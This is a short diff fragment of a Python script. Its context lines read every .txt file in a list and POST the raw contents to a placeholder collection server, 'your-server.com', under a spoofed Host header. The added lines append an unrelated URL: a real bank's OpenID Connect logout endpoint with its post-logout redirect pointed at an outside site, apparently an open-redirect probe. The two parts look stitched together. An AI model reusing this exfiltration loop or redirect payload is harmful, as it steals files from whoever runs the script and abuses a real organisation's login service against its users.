@@ -50,3 +50,6 @@ for txt_file in txt_files:
     with open(txt_file, 'rb') as f:
         data = f.read()
     requests.post('http://your-server.com/receive', data=data, headers={'Host': 'reg.ru'})
+
+------
+https://hr.sberbank.ru/auth/realms/PAOSberbank/protocol/openid-connect/logout?post_logout_redirect_uri=http://2ip.ru/
